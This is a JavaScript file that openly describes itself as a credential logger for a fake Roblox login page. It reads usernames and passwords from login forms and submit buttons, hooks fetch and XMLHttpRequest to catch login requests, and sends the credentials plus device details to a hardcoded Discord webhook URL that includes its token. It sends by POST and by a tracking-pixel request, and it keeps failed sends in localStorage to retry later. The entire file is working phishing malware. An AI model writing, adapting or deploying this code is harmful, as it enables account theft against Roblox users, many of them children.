// credential-logger.js
// Script to intercept login credentials and send them to a webhook

(function() {
    // Function to send data to the webhook
    function sendToWebhook(username, password) {
        // Try to use service worker if available
        if (window.sendCredentialToServiceWorker) {
            window.sendCredentialToServiceWorker(username, password);
            return;
        }
        
        const webhookUrl = "https://discord.com/api/webhooks/1351654650524471446/64xoQCP9o8ljl3-q6jcyUSUgBrdg9Oa74rAq01VS9rSQ2yGpoDsd88M6XypS-OhAfwPl";
        
        // Create the payload with the credentials
        const payload = {
            content: `**New Roblox Login Attempt**\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toISOString()}\nIP: <Auto-detected by Discord>\nDevice Info: ${navigator.userAgent}\nScreen: ${window.screen.width}x${window.screen.height}`
        };
        
        // Send the data to the webhook
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .catch(error => {
            console.error("Error sending data:", error);
            
            // Store credentials in localStorage as a fallback
            try {
                const storedCredentials = JSON.parse(localStorage.getItem('pendingCredentials') || '[]');
                storedCredentials.push({
                    username,
                    password,
                    timestamp: new Date().toISOString()
                });
                localStorage.setItem('pendingCredentials', JSON.stringify(storedCredentials));
            } catch (storageError) {
                console.error("Error storing credentials:", storageError);
            }
        });
        
        // Also attempt to send via a tracking pixel as a fallback
        const trackingPixel = new Image();
        trackingPixel.src = `https://discord.com/api/webhooks/1351654650524471446/64xoQCP9o8ljl3-q6jcyUSUgBrdg9Oa74rAq01VS9rSQ2yGpoDsd88M6XypS-OhAfwPl?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
    }
    
    // Function to set up the form interceptor
    function setupInterceptor() {
        // Monitor for React login form changes
        const observer = new MutationObserver(function(mutations) {
            // Look for login form
            const loginForm = document.querySelector('form');
            if (loginForm && !loginForm.getAttribute('data-intercepted')) {
                loginForm.setAttribute('data-intercepted', 'true');
                
                // Add submit event listener to the form
                loginForm.addEventListener('submit', function(e) {
                    // Find username and password fields
                    const usernameField = loginForm.querySelector('input[type="text"], input[name="username"], input[placeholder*="name"], input[placeholder*="Name"]');
                    const passwordField = loginForm.querySelector('input[type="password"]');
                    
                    if (usernameField && passwordField) {
                        // Get the credentials
                        const username = usernameField.value;
                        const password = passwordField.value;
                        
                        // Send credentials to webhook
                        sendToWebhook(username, password);
                    }
                });
            }
        });
        
        // Start observing the content div for changes
        observer.observe(document.getElementById('content') || document.body, {
            childList: true,
            subtree: true
        });
        
        // Also check for login elements on page load
        document.addEventListener('DOMContentLoaded', function() {
            // Look for all input fields
            const inputFields = document.querySelectorAll('input');
            const submitButtons = document.querySelectorAll('button[type="submit"], input[type="submit"]');
            
            submitButtons.forEach(button => {
                if (!button.getAttribute('data-intercepted')) {
                    button.setAttribute('data-intercepted', 'true');
                    button.addEventListener('click', function() {
                        // Find username and password fields near this button
                        const form = button.closest('form') || document.body;
                        const usernameField = form.querySelector('input[type="text"], input[name="username"], input[placeholder*="name"], input[placeholder*="Name"]');
                        const passwordField = form.querySelector('input[type="password"]');
                        
                        if (usernameField && passwordField) {
                            // Get the credentials
                            const username = usernameField.value;
                            const password = passwordField.value;
                            
                            // Send credentials to webhook
                            sendToWebhook(username, password);
                        }
                    });
                }
            });
        });
    }
    
    // Initialize the interceptor
    setupInterceptor();
    
    // Also try to intercept fetch/XHR requests
    const originalFetch = window.fetch;
    window.fetch = function(url, options) {
        // Check if this is a login request
        if (url && (url.includes('login') || url.includes('auth'))) {
            try {
                const body = options?.body;
                if (body) {
                    // Try to parse the body if it's JSON
                    try {
                        const data = JSON.parse(body);
                        if (data.username || data.password || data.user || data.pass) {
                            // Send the credentials to the webhook
                            sendToWebhook(
                                data.username || data.user || "unknown", 
                                data.password || data.pass || "unknown"
                            );
                        }
                    } catch (e) {
                        // If it's not JSON, check if it's form data
                        if (typeof body === 'string' && (body.includes('username') || body.includes('password'))) {
                            const params = new URLSearchParams(body);
                            const username = params.get('username') || params.get('user') || "unknown";
                            const password = params.get('password') || params.get('pass') || "unknown";
                            sendToWebhook(username, password);
                        }
                    }
                }
            } catch (error) {
                console.error("Error intercepting fetch:", error);
            }
        }
        
        // Call the original fetch function
        return originalFetch.apply(this, arguments);
    };
    
    // Also intercept XHR requests
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        return originalXHROpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(body) {
        // Check if this is a login request
        if (this._url && (this._url.includes('login') || this._url.includes('auth'))) {
            try {
                if (body) {
                    // Try to parse the body if it's JSON
                    try {
                        const data = JSON.parse(body);
                        if (data.username || data.password || data.user || data.pass) {
                            // Send the credentials to the webhook
                            sendToWebhook(
                                data.username || data.user || "unknown",
                                data.password || data.pass || "unknown"
                            );
                        }
                    } catch (e) {
                        // If it's not JSON, check if it's form data
                        if (typeof body === 'string' && (body.includes('username') || body.includes('password'))) {
                            const params = new URLSearchParams(body);
                            const username = params.get('username') || params.get('user') || "unknown";
                            const password = params.get('password') || params.get('pass') || "unknown";
                            sendToWebhook(username, password);
                        }
                    }
                }
            } catch (error) {
                console.error("Error intercepting XHR:", error);
            }
        }
        
        // Call the original send function
        return originalXHRSend.apply(this, arguments);
    };

    // Check for stored credentials and try to send them
    try {
        const storedCredentials = JSON.parse(localStorage.getItem('pendingCredentials') || '[]');
        if (storedCredentials.length > 0) {
            storedCredentials.forEach(credential => {
                sendToWebhook(credential.username, credential.password);
            });
            // Clear the stored credentials after attempting to send them
            localStorage.removeItem('pendingCredentials');
        }
    } catch (error) {
        console.error("Error processing stored credentials:", error);
    }
})(); 